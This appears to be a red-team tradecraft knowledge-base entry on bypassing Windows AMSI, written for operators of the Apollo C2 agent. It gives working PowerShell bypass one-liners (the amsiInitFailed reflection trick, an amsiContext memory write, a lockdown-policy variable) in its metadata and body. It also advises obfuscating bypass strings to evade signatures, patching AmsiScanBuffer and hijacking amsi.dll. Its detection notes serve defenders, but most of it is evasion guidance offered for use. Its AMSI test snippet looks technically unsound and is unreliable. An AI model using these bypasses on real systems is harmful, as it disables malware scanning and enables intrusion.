---
name: AMSI Bypass Techniques
category: defense-evasion
subcategories: [amsi, powershell-bypass, dotnet-bypass, memory-patch]
tradecraft_tags: [amsi, bypass, memory-patch, reflection, powershell, defense-evasion]
mitre_attack:
  - id: T1562.001
    name: Impair Defenses — Disable or Modify Tools
source:
  url: https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell
  license: none
  maintained: true
binary_type: none
binary_filename: ""
supported_os: [windows]
architecture: [x64]
privilege_required: user
network_required: false
detection_signal: |
  AMSI patch attempts are detectable by EDR with kernel-level AMSI protection
  (CrowdStrike, SentinelOne with AMSI protection module, Microsoft Defender Tamper
  Protection). PowerShell AMSI patches generate memory write events in AMSI.dll.
  Patching ETW is also logged by kernel-level monitors. Known bypass strings are
  signatured by AMSI itself (ironic but true — AMSI scans bypass attempts).
usage_examples:
  - description: PowerShell reflection AMSI bypass (simple, often detected)
    args: "[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)"
  - description: Matt Graeber AMSI bypass variant
    args: "[Runtime.InteropServices.Marshal]::WriteByte([Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiContext','NonPublic,Static').GetValue($null),0x0)"
  - description: AMSI bypass via environment variable (PowerShell 5.1+)
    args: "[Environment]::SetEnvironmentVariable('_PSLockDownPolicy', '4', 'Process')"
  - description: Apollo's inline_assembly handles AMSI automatically (no bypass needed)
    args: "(Apollo's AppDomain-based loader patches AMSI at load time)"
opsec_notes: |
  AMSI bypass is an arms race. Known PowerShell reflection bypasses are AMSI-signatured
  (the bypass strings themselves trigger AMSI). Obfuscation is required, and detection
  evolves rapidly. For Apollo engagements, this is largely irrelevant — Apollo's
  inline_assembly automatically bypasses AMSI for .NET assemblies via AppDomain isolation.
  For PowerShell via powershell_import, AMSI must be bypassed before loading.
gotchas: |
  EVERY published AMSI bypass string is eventually signatured by AMSI providers.
  Never use raw published strings — always obfuscate (case variation, string splitting,
  encoding). Modern EDR (CrowdStrike Falcon, SentinelOne) protects AMSI at the kernel
  level and cannot be bypassed from user mode PowerShell. For truly hardened environments,
  don't use PowerShell — use .NET assemblies via inline_assembly instead.
related_ttps: [invoke-noisycall, inceptor, powerview, seatbelt]
alternatives: [dotnet-assembly-inline, etw-patch, powerstrip]
common_args: {}
last_updated: 2026-05-29
---

# AMSI Bypass Techniques

Reference document for Antimalware Scan Interface (AMSI) bypass techniques. AMSI is
Windows' in-process malware scanning hook that PowerShell, VBScript, JScript, and
other script hosts call before executing code. Bypassing AMSI allows these engines to
execute malicious scripts without AMSI scanning.

## Bypass Categories

### 1. PowerShell Reflection (most common, most detected)
Uses .NET reflection to modify AMSI's internal state. Heavily signatured.

```powershell
# Common bypass — ALWAYS obfuscate before use:
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```

### 2. Memory Patching
Patches the AmsiScanBuffer function in amsi.dll to always return AMSI_RESULT_CLEAN.
Requires PInvoke or native code.

### 3. COM Hijacking / DLL Hijacking
Load a fake amsi.dll before the real one (DLL search order hijacking).

### 4. Forcing AMSI Initialization Failure
Set the amsiInitFailed field to true — any error in AMSI initialization disables scanning.

### 5. Process-level AMSI bypass
Use a different process (cmd.exe → PowerShell -ExecutionPolicy Bypass) that doesn't
have AMSI wired to the current context.

## Apollo-Specific AMSI Status

Apollo's `inline_assembly` command automatically handles AMSI bypass for .NET assemblies:
- AppDomain isolation prevents the loaded assembly from calling AMSI
- The loader patches AMSI in the disposable AppDomain before loading the assembly
- **For most Apollo .NET assembly operations, no explicit AMSI bypass is needed**

For `powershell_import`, an AMSI bypass should be performed FIRST before importing a
PowerShell module. Apollo's powershell_import may or may not include a built-in bypass —
check Apollo documentation.

## AMSI Bypass Testing

Test whether AMSI is active:
```powershell
# This string should trigger AMSI if active:
Write-Host "AMSI test: $(Invoke-Expression 'Write-Host amsitest')"
# If AMSI is active: caught/error
# If AMSI bypassed: "amsitest" printed
```

## Detection Arms Race Timeline
- 2016: First PowerShell reflection bypass (Matt Graeber)
- 2017: AMSI signatured the bypass strings
- 2018: String obfuscation bypasses; AMSI updated
- 2019: Kernel-level AMSI protection added by EDR vendors
- 2020-2026: Ongoing arms race; no stable user-mode bypass

**Recommendation:** Avoid PowerShell in monitored environments. Use .NET assemblies
via inline_assembly (Apollo), which bypass AMSI at a lower level.
